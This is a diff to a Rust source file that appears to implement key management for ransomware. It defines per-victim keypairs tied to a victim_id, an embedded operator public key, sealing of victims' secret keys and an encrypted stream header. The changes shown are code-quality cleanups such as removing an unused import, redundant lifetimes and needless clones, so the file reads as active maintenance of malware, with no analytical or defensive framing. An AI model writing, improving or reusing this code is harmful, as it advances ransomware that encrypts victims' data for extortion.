@@ -1,6 +1,5 @@
 use std::io::Read;
 
-use bs58;
 use dryoc::dryocbox;
 use dryoc::dryocbox::DryocBox;
 use dryoc::generichash;
@@ -18,9 +17,9 @@ use zeroize::Zeroize;
 use zeroize::Zeroizing;
 
 const BLOCK_SIZE: usize = 1024 * 1024;
-static OPERATOR_PUBLIC_KEY: &'static [u8; 32] = include_bytes!("../assets/operator_public_key.bin");
+static OPERATOR_PUBLIC_KEY: &[u8; 32] = include_bytes!("../assets/operator_public_key.bin");
 
-#[derive(Clone, Debug, PartialEq)]
+#[derive(Debug, PartialEq)]
 pub struct PerVictimKey {
     victim_id: Uuid,
     keypair: dryocbox::KeyPair,
@@ -48,14 +47,14 @@ impl PerVictimKey {
         let auth_key: generichash::Key = kdf.derive_subkey(1).unwrap();
         let seal_seed: dryocbox::SecretKey = kdf.derive_subkey(2).unwrap();
         Self {
-            victim_id: victim_id.clone(),
+            victim_id: *victim_id,
             sealed: Self::seal(&secret_key, &seal_seed),
             keypair: dryocbox::KeyPair::from_secret_key(secret_key),
             identity_proof: GenericHash::hash(victim_id.as_bytes(), Some(&auth_key)).unwrap(),
         }
     }
     pub fn generate(victim_id: &Uuid) -> Self {
-        Self::new(&victim_id, dryocbox::SecretKey::gen())
+        Self::new(victim_id, dryocbox::SecretKey::gen())
     }
     pub fn dump(&self) -> Zeroizing<Vec<u8>> {
         // Note: with_capacity is important! Otherwise we may fail to zeroize all copies of the key.
@@ -122,7 +121,7 @@ pub struct EncryptedStreamHeader {
 }
 
 impl EncryptedStreamHeader {
-    pub fn to_vec(self: &Self) -> Vec<u8> {
+    pub fn to_vec(&self) -> Vec<u8> {
         let mut v = Vec::new();
         v.extend_from_slice(&self.keyid);
         v.extend_from_slice(self.epk.as_array());
